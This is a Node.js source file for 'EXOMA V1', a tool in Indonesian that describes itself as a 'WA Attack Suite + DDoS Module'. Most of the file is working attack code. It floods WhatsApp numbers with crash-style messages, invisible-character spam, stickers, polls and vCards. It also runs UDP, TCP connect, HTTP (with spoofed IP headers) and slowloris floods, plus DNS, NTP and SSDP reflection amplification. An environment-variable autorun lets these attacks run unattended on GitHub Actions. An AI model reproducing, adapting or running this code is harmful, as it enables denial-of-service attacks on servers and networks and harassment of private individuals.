#!/usr/bin/env node
// ============================================
// EXOMA V1 - Single File Edition
// WA Attack Suite + DDoS Module + Menu
// ============================================
const fs = require("fs")
const path = require("path")
const readline = require("readline")
const dgram = require("dgram")
const net = require("net")
const http = require("http")
const https = require("https")
const { URL } = require("url")

let makeWASocket, useMultiFileAuthState, delay, DisconnectReason,
    makeCacheableSignalKeyStore, fetchLatestBaileysVersion
try {
  const b = require("@whiskeysockets/baileys")
  makeWASocket = b.default
  useMultiFileAuthState = b.useMultiFileAuthState
  delay = b.delay
  DisconnectReason = b.DisconnectReason
  makeCacheableSignalKeyStore = b.makeCacheableSignalKeyStore
  fetchLatestBaileysVersion = b.fetchLatestBaileysVersion
} catch (e) {
  console.error("[!] Install dulu: npm install @whiskeysockets/baileys pino qrcode-terminal")
  process.exit(1)
}
const P = require("pino")
const qrcode = require("qrcode-terminal")

const logger = P({ level: "silent" })

// ============ COLORS ============
const C = {
  r: (s) => `\x1b[1;31m${s}\x1b[0m`,
  d: (s) => `\x1b[0;31m${s}\x1b[0m`,
  g: (s) => `\x1b[0;32m${s}\x1b[0m`,
  y: (s) => `\x1b[0;33m${s}\x1b[0m`,
  w: (s) => `\x1b[0;37m${s}\x1b[0m`
}

// ============ LOG ============
const LOG_DIR = path.join(__dirname, "logs")
if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR, { recursive: true })
const LOG_FILE = path.join(LOG_DIR, `exoma-${Date.now()}.log`)

function log(msg) {
  const line = `[${new Date().toISOString()}] ${msg}`
  console.log(C.d(line))
  try { fs.appendFileSync(LOG_FILE, line + "\n") } catch (e) {}
}

// ============ UTILS ============
function normalize(num) {
  let n = String(num).replace(/[^0-9]/g, "")
  if (n.startsWith("0")) n = "62" + n.slice(1)
  if (!n.startsWith("62")) n = "62" + n
  return n + "@s.whatsapp.net"
}

function ask(q) {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
  return new Promise(r => rl.question(q, a => { rl.close(); r(String(a).trim()) }))
}

function rnd(a, b) { return Math.floor(Math.random() * (b - a + 1)) + a }
function pick(arr) { return arr[Math.floor(Math.random() * arr.length)] }
function nap(ms) { return new Promise(r => setTimeout(r, ms)) }

// ============================================
//                   BANNER
// ============================================
function banner() {
  console.log(C.r(`
 ███████╗██╗  ██╗ ██████╗ ███╗   ███╗ █████╗
 ██╔════╝╚██╗██╔╝██╔═══██╗████╗ ████║██╔══██╗
 █████╗   ╚███╔╝ ██║   ██║██╔████╔██║███████║
 ██╔══╝   ██╔██╗ ██║   ██║██║╚██╔╝██║██╔══██║
 ███████╗██╔╝ ██╗╚██████╔╝██║ ╚═╝ ██║██║  ██║
 ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝
              E X O M A   V 1
       WA Attack Suite + DDoS Module
`))
}

// ============================================
//              WHATSAPP MODES
// ============================================
async function crashBomb(sock, jid, n) {
  const p = "EXOMA V1 >> " + "A".repeat(4000)
  let ok = 0, fail = 0
  for (let i = 0; i < n; i++) {
    try { await sock.sendMessage(jid, { text: p + "\n#" + i }); ok++; await nap(15) }
    catch (e) { fail++ }
  }
  return { ok, fail }
}

async function bugTotal(sock, jid, n) {
  let ok = 0, fail = 0
  for (let i = 0; i < n; i++) {
    try {
      const r = rnd(0, 4)
      if (r === 0) await sock.sendMessage(jid, { text: "BUG-TOTAL " + Date.now() })
      else if (r === 1) await sock.sendMessage(jid, { text: "multi\n".repeat(2000) })
      else if (r === 2) await sock.sendMessage(jid, { text: "\u0000\u0000\u0000EXOMA\u0000\u0000" })
      else if (r === 3) await sock.sendMessage(jid, {
        contacts: { displayName: "X", contacts: [{ vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:EXOMA" + i + "\nEND:VCARD" }] }
      })
      else await sock.sendMessage(jid, { text: "unicode ⁧" + "‮".repeat(50) + "EXOMA" })
      ok++; await nap(25)
    } catch (e) { fail++ }
  }
  return { ok, fail }
}

async function ghostFlood(sock, jid, n) {
  let ok = 0, fail = 0
  for (let i = 0; i < n; i++) {
    try { await sock.sendMessage(jid, { text: "\u200B".repeat(500) + i }); ok++; await nap(5) }
    catch (e) { fail++ }
  }
  return { ok, fail }
}

async function mirrorSpam(sock, jid, n) {
  let ok = 0, fail = 0
  for (let i = 0; i < n; i++) {
    try { await sock.sendMessage(jid, { text: "join grup ini:\nhttps://chat.whatsapp.com/EXOMA" + i }); ok++; await nap(30) }
    catch (e) { fail++ }
  }
  return { ok, fail }
}

async function stickerStorm(sock, jid, n) {
  const buf = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64")
  let ok = 0, fail = 0
  for (let i = 0; i < n; i++) {
    try { await sock.sendMessage(jid, { sticker: buf }); ok++; await nap(15) }
    catch (e) { fail++ }
  }
  return { ok, fail }
}

async function reactionRaid(sock, jid, n) {
  const emojis = ["🩸", "💀", "🔥", "⚡", "☠️", "🧨", "💥", "👹"]
  let ok = 0, fail = 0
  const anchor = await sock.sendMessage(jid, { text: "EXOMA V1" })
  for (let i = 0; i < n; i++) {
    try { await sock.sendMessage(jid, { react: { text: emojis[i % emojis.length], key: anchor.key } }); ok++; await nap(10) }
    catch (e) { fail++ }
  }
  return { ok, fail }
}

async function pollBomb(sock, jid, n) {
  let ok = 0, fail = 0
  for (let i = 0; i < n; i++) {
    try {
      await sock.sendMessage(jid, {
        poll: { name: "EXOMA POLL #" + i, values: ["A", "B", "C", "D", "E"], selectableCount: 1 }
      })
      ok++; await nap(25)
    } catch (e) { fail++ }
  }
  return { ok, fail }
}

async function vcardHurricane(sock, jid, n) {
  let ok = 0, fail = 0
  for (let i = 0; i < n; i++) {
    try {
      const vcard = "BEGIN:VCARD\nVERSION:3.0\nFN:EXOMA" + i +
        "\nTEL;type=CELL;type=VOICE;waid=628" + (100000000 + i) + "\nEND:VCARD"
      await sock.sendMessage(jid, { contacts: { displayName: "EXOMA", contacts: [{ vcard }] } })
      ok++; await nap(20)
    } catch (e) { fail++ }
  }
  return { ok, fail }
}

async function exomaUltra(sock, jid, n) {
  const per = Math.max(1, Math.floor(n / 5))
  const r1 = await crashBomb(sock, jid, per)
  const r2 = await bugTotal(sock, jid, per)
  const r3 = await ghostFlood(sock, jid, per)
  const r4 = await stickerStorm(sock, jid, per)
  const r5 = await vcardHurricane(sock, jid, per)
  return { ok: r1.ok + r2.ok + r3.ok + r4.ok + r5.ok, fail: r1.fail + r2.fail + r3.fail + r4.fail + r5.fail }
}

const WA_MODES = {
  "crash-bomb": crashBomb,
  "bug-total": bugTotal,
  "ghost-flood": ghostFlood,
  "mirror-spam": mirrorSpam,
  "sticker-storm": stickerStorm,
  "reaction-raid": reactionRaid,
  "poll-bomb": pollBomb,
  "vcard-hurricane": vcardHurricane,
  "exoma-ultra": exomaUltra
}

// ============================================
//              DDOS MODES
// ============================================
async function udpFlood(target, port, duration, threads, size) {
  log(`UDP-FLOOD ${target}:${port} dur=${duration}s th=${threads} sz=${size}`)
  const end = Date.now() + duration * 1000
  const payload = Buffer.alloc(size || 1024, "X")
  const workers = []
  for (let i = 0; i < threads; i++) {
    workers.push(new Promise((resolve) => {
      const sock = dgram.createSocket("udp4")
      sock.on("error", () => {})
      let sent = 0
      const loop = () => {
        if (Date.now() > end) { try { sock.close() } catch (e) {} return resolve(sent) }
        for (let k = 0; k < 50; k++) {
          try { sock.send(payload, 0, payload.length, port, target, () => {}); sent++ } catch (e) { break }
        }
        setImmediate(loop)
      }
      loop()
    }))
  }
  const res = await Promise.all(workers)
  const total = res.reduce((a, b) => a + b, 0)
  log(`UDP-FLOOD done pkt=${total}`)
  return { ok: total, fail: 0 }
}

async function synFlood(target, port, duration, threads) {
  log(`SYN-FLOOD ${target}:${port} dur=${duration}s th=${threads}`)
  const end = Date.now() + duration * 1000
  let total = 0
  const workers = []
  for (let i = 0; i < threads; i++) {
    workers.push(new Promise((resolve) => {
      const loop = () => {
        if (Date.now() > end) return resolve(total)
        for (let k = 0; k < 100; k++) {
          try {
            const s = new net.Socket()
            s.setTimeout(300)
            s.on("error", () => {})
            s.on("timeout", () => { try { s.destroy() } catch (e) {} })
            s.connect(port, target, () => { try { s.destroy() } catch (e) {} })
            total++
          } catch (e) {}
        }
        setImmediate(loop)
      }
      loop()
    }))
  }
  await Promise.all(workers)
  log(`SYN-FLOOD done total=${total}`)
  return { ok: total, fail: 0 }
}

const UAS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
]
const REFS = ["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/", "https://t.co/", "https://www.facebook.com/"]

async function httpFlood(target, port, duration, threads, size, method) {
  const u = new URL(target)
  const isHttps = u.protocol === "https:"
  const lib = isHttps ? https : http
  const realPort = u.port || (isHttps ? 443 : 80)
  const m = (method || "GET").toUpperCase()
  log(`HTTP-FLOOD ${target} m=${m} dur=${duration}s th=${threads}`)
  const end = Date.now() + duration * 1000
  let total = 0, fail = 0

  const agentHttp = new http.Agent({ keepAlive: true, maxSockets: 512 })
  const agentHttps = new https.Agent({ keepAlive: true, maxSockets: 512, rejectUnauthorized: false })

  const workers = []
  for (let i = 0; i < threads; i++) {
    workers.push(new Promise((resolve) => {
      const loop = () => {
        if (Date.now() > end) return resolve()
        for (let k = 0; k < 20; k++) {
          try {
            const ip = `${rnd(1,255)}.${rnd(1,255)}.${rnd(1,255)}.${rnd(1,255)}`
            const opts = {
              protocol: u.protocol,
              hostname: u.hostname,
              port: realPort,
              path: u.pathname + u.search + "?exoma=" + Math.random().toString(36).slice(2, 12),
              method: m,
              headers: {
                "User-Agent": pick(UAS),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Referer": pick(REFS),
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "X-Forwarded-For": ip,
                "X-Real-IP": ip,
                "CF-Connecting-IP": ip,
                "Client-IP": ip
              },
              agent: isHttps ? agentHttps : agentHttp,
              timeout: 5000
            }
            const req = lib.request(opts, (res) => {
              total++
              res.on("data", () => {})
              res.on("end", () => {})
            })
            req.on("error", () => { fail++ })
            req.on("timeout", () => { try { req.destroy() } catch (e) {} })
            if (m === "POST") req.write("X".repeat(size || 1024))
            req.end()
          } catch (e) { fail++ }
        }
        setImmediate(loop)
      }
      loop()
    }))
  }
  await Promise.all(workers)
  log(`HTTP-FLOOD done total=${total} fail=${fail}`)
  return { ok: total, fail }
}

async function slowloris(target, port, duration, threads) {
  const u = new URL(target)
  const realPort = u.port || (u.protocol === "https:" ? 443 : 80)
  const host = u.hostname
  log(`SLOWLORIS ${host}:${realPort} dur=${duration}s sockets=${threads}`)
  const end = Date.now() + duration * 1000
  const conns = []
  let keep = 0
  for (let i = 0; i < threads; i++) {
    try {
      const s = new net.Socket()
      s.setTimeout(0)
      s.on("error", () => {})
      s.connect(realPort, host, () => {
        s.write(`GET ${u.pathname} HTTP/1.1\r\n`)
        s.write(`Host: ${host}\r\n`)
        s.write(`User-Agent: Mozilla/5.0\r\n`)
      })
      conns.push(s)
    } catch (e) {}
  }
  const pump = setInterval(() => {
    if (Date.now() > end) { clearInterval(pump); return }
    conns.forEach(s => { try { s.write(`X-Keep: ${Math.random()}\r\n`); keep++ } catch (e) {} })
  }, 8000)
  return new Promise((resolve) => {
    setTimeout(() => {
      clearInterval(pump)
      conns.forEach(s => { try { s.destroy() } catch (e) {} })
      log(`SLOWLORIS done keep=${keep} sockets=${conns.length}`)
      resolve({ ok: keep, fail: 0 })
    }, duration * 1000 + 500)
  })
}

const AMP_PAYLOADS = {
  dns: Buffer.from("0000010000010000000000000377777706676f6f676c6503636f6d0000010001", "hex"),
  ntp: Buffer.from("1700032a000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000", "hex"),
  ssdp: Buffer.from("4d2d534541524348202a20485454502f312e310d0a484f53543a3233392e3235352e3235352e3235303a313930300d0a4d414e3a22737364703a646973636f766572220d0a4d583a320d0a53543a75726e3a736368656d61732d75706e702d6f72673a6465766963653a496e7465726e6574476174657761794465766963653a310d0a0d0a", "hex")
}
const AMP_PORTS = { dns: 53, ntp: 123, ssdp: 1900 }

async function ampFlood(reflector, type, duration, rate) {
  const payload = AMP_PAYLOADS[type]
  const port = AMP_PORTS[type]
  if (!payload) { log(`AMP unknown ${type}`); return { ok: 0, fail: 0 } }
  log(`AMP-${type.toUpperCase()} reflector=${reflector}:${port} dur=${duration}s rate=${rate}`)
  const end = Date.now() + duration * 1000
  const sock = dgram.createSocket("udp4")
  sock.on("error", () => {})
  let sent = 0
  const pump = setInterval(() => {
    if (Date.now() > end) {
      clearInterval(pump)
      try { sock.close() } catch (e) {}
      log(`AMP-${type.toUpperCase()} done sent=${sent}`)
      return
    }
    for (let i = 0; i < rate; i++) {
      try { sock.send(payload, 0, payload.length, port, reflector, () => {}); sent++ } catch (e) {}
    }
  }, 100)
  return new Promise((resolve) => setTimeout(() => resolve({ ok: sent, fail: 0 }), duration * 1000 + 500))
}

async function runDDoS(opts) {
  const { mode, target, port, duration, threads, size, method } = opts
  switch (mode) {
    case "udp": return udpFlood(target, port, duration, threads, size)
    case "syn": return synFlood(target, port, duration, threads)
    case "http": return httpFlood(target, port, duration, threads, size, method)
    case "slowloris": return slowloris(target, port, duration, threads)
    case "amp-dns": return ampFlood(target, "dns", duration, threads)
    case "amp-ntp": return ampFlood(target, "ntp", duration, threads)
    case "amp-ssdp": return ampFlood(target, "ssdp", duration, threads)
    default: log("DDoS mode tidak dikenal: " + mode); return { ok: 0, fail: 0 }
  }
}

// ============================================
//              WHATSAPP CONNECT
// ============================================
async function connectWA(onReady) {
  const { state, saveCreds } = await useMultiFileAuthState("./session")
  const { version } = await fetchLatestBaileysVersion()
  const sock = makeWASocket({
    version,
    logger,
    printQRInTerminal: false,
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, logger)
    },
    browser: ["EXOMA", "Chrome", "1.0.0"],
    syncFullHistory: false
  })
  sock.ev.on("creds.update", saveCreds)
  sock.ev.on("connection.update", (u) => {
    const { connection, lastDisconnect, qr } = u
    if (qr) {
      console.log(C.y("\n[ QR ] Scan di WhatsApp:\n"))
      qrcode.generate(qr, { small: true })
    }
    if (connection === "open") {
      log("EXOMA V1 WA CONNECTED")
      if (onReady) onReady(sock)
    }
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode
      if (code !== DisconnectReason.loggedOut) {
        log("Koneksi putus, reconnect...")
        connectWA(onReady)
      } else {
        log("Logged out. Hapus ./session buat scan ulang.")
      }
    }
  })
  return sock
}

// ============================================
//                MENUS
// ============================================
const WA_MENU = {
  1: { key: "crash-bomb", label: "CRASH-BOMB" },
  2: { key: "bug-total", label: "BUG-TOTAL" },
  3: { key: "ghost-flood", label: "GHOST-FLOOD" },
  4: { key: "mirror-spam", label: "MIRROR-SPAM" },
  5: { key: "sticker-storm", label: "STICKER-STORM" },
  6: { key: "reaction-raid", label: "REACTION-RAID" },
  7: { key: "poll-bomb", label: "POLL-BOMB" },
  8: { key: "vcard-hurricane", label: "VCARD-HURRICANE" },
  9: { key: "exoma-ultra", label: "EXOMA-ULTRA (FULL)" }
}

const DDOS_MENU = {
  1: { key: "udp", label: "UDP-FLOOD     (L4 ip:port)" },
  2: { key: "syn", label: "SYN-FLOOD     (L4 ip:port)" },
  3: { key: "http", label: "HTTP-FLOOD    (L7 url)" },
  4: { key: "slowloris", label: "SLOWLORIS     (L7 url)" },
  5: { key: "amp-dns", label: "DNS-AMP       (reflector ip)" },
  6: { key: "amp-ntp", label: "NTP-AMP       (reflector ip)" },
  7: { key: "amp-ssdp", label: "SSDP-AMP      (reflector ip)" }
}

async function waMenu(sock) {
  console.log(C.r("\n===== WA ATTACK SUITE ====="))
  for (const [k, v] of Object.entries(WA_MENU)) console.log(C.w(`  ${k}. ${v.label}`))
  console.log(C.r("===========================\n"))
  const pick_ = await ask(C.y("Pilih mode WA [1-9] (0=batal): "))
  if (pick_ === "0") return null
  const item = WA_MENU[pick_]
  if (!item) { console.log(C.r("invalid")); return null }
  const target = await ask(C.y("Nomor target (62xxx): "))
  const jumlah = parseInt(await ask(C.y("Jumlah: "))) || 50
  return { mode: item.key, target, jumlah }
}

async function ddosMenu() {
  console.log(C.r("\n===== DDOS MODULE ====="))
  for (const [k, v] of Object.entries(DDOS_MENU)) console.log(C.w(`  ${k}. ${v.label}`))
  console.log(C.r("=======================\n"))
  const pick_ = await ask(C.y("Pilih mode DDoS [1-7] (0=batal): "))
  if (pick_ === "0") return null
  const item = DDOS_MENU[pick_]
  if (!item) { console.log(C.r("invalid")); return null }

  let target, port = 0, duration = 60, threads = 200, size = 1024, method = "GET"

  if (item.key === "udp" || item.key === "syn") {
    target = await ask(C.y("Target IP / domain: "))
    port = parseInt(await ask(C.y("Port: "))) || 80
    duration = parseInt(await ask(C.y("Durasi (s): "))) || 60
    threads = parseInt(await ask(C.y("Threads: "))) || 200
    if (item.key === "udp") size = parseInt(await ask(C.y("Packet size: "))) || 1024
  } else if (item.key === "http") {
    target = await ask(C.y("Target URL (https://...): "))
    duration = parseInt(await ask(C.y("Durasi (s): "))) || 60
    threads = parseInt(await ask(C.y("Threads: "))) || 100
    method = (await ask(C.y("Method GET/POST (GET): "))).toUpperCase() || "GET"
  } else if (item.key === "slowloris") {
    target = await ask(C.y("Target URL (https://...): "))
    duration = parseInt(await ask(C.y("Durasi (s): "))) || 120
    threads = parseInt(await ask(C.y("Jumlah sockets: "))) || 500
  } else {
    target = await ask(C.y("Reflector IP: "))
    duration = parseInt(await ask(C.y("Durasi (s): "))) || 60
    threads = parseInt(await ask(C.y("Rate (pkt/100ms): "))) || 200
  }
  return { mode: item.key, target, port, duration, threads, size, method }
}

// ============================================
//                MAIN
// ============================================
async function main() {
  banner()

  // AUTORUN via env (buat GitHub Actions)
  const autoWa = process.env.EXOMA_MODE && process.env.EXOMA_AUTORUN === "1"
  const autoDd = process.env.EXOMA_DDOS_MODE

  if (autoDd) {
    log("AUTORUN DDoS")
    const r = await runDDoS({
      mode: process.env.EXOMA_DDOS_MODE,
      target: process.env.EXOMA_DDOS_TARGET,
      port: parseInt(process.env.EXOMA_DDOS_PORT) || 80,
      duration: parseInt(process.env.EXOMA_DDOS_DURATION) || 60,
      threads: parseInt(process.env.EXOMA_DDOS_THREADS) || 200,
      size: parseInt(process.env.EXOMA_DDOS_SIZE) || 1024,
      method: process.env.EXOMA_DDOS_METHOD || "GET"
    })
    log("DDoS autorun done: " + JSON.stringify(r))
    process.exit(0)
  }

  if (autoWa) {
    log("AUTORUN WA")
    await connectWA(async (sock) => {
      const jid = normalize(process.env.EXOMA_TARGET)
      const fn = WA_MODES[process.env.EXOMA_MODE]
      if (!fn) { log("WA mode invalid"); process.exit(1) }
      const r = await fn(sock, jid, parseInt(process.env.EXOMA_JUMLAH) || 50)
      log("WA autorun done: " + JSON.stringify(r))
      process.exit(0)
    })
    return
  }

  // INTERAKTIF
  while (true) {
    console.log(C.r("\n===== EXOMA V1 ROOT MENU ====="))
    console.log(C.w("  1. WhatsApp Attack Suite (scan QR)"))
    console.log(C.w("  2. DDoS Module"))
    console.log(C.w("  3. Exit"))
    console.log(C.r("==============================\n"))
    const pick_ = await ask(C.y("Pilih: "))

    if (pick_ === "1") {
      await new Promise((resolve) => {
        connectWA(async (sock) => {
          while (true) {
            const p = await waMenu(sock)
            if (!p) break
            log(`WA ATTACK ${p.mode} -> ${p.target} x${p.jumlah}`)
            const r = await WA_MODES[p.mode](sock, normalize(p.target), p.jumlah)
            log(`WA DONE ok=${r.ok} fail=${r.fail}`)
            const c = await ask(C.y("\nLagi? (y/n): "))
            if (c.toLowerCase() !== "y") break
          }
          resolve()
        })
      })
    } else if (pick_ === "2") {
      while (true) {
        const p = await ddosMenu()
        if (!p) break
        log(`DDOS ATTACK ${JSON.stringify(p)}`)
        const r = await runDDoS(p)
        log(`DDOS DONE ok=${r.ok} fail=${r.fail}`)
        const c = await ask(C.y("\nLagi? (y/n): "))
        if (c.toLowerCase() !== "y") break
      }
    } else {
      console.log(C.r("Keluar. Sampai jumpa sayangg."))
      process.exit(0)
    }
  }
}

main().catch(e => {
  console.error(C.r("FATAL: " + e.message))
  process.exit(1)
})
